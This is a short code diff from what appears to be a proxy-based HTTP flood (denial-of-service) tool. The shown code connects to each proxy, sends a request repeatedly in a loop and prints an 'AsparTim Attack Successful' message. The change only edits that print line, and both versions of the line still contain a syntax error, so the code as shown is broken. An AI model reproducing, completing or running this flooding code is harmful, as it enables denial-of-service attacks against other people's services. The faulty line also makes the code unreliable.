@@ -350,7 +350,7 @@ class RequestProxyHTTP(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(proxy[0]), int(proxy[1]))) 
 				s.send(str.encode(request))
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mAsparTim Attack Successful " + str(proxy[0]+":"+proxy[1]) + \033[0m" ✓")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mAsparTim Attack Successful " + str(proxy[0]+":"+proxy[1]) + \033[0m"+" ✓")
 				try:
 					for y in range(multiple): 
 						s.send(str.encode(request))
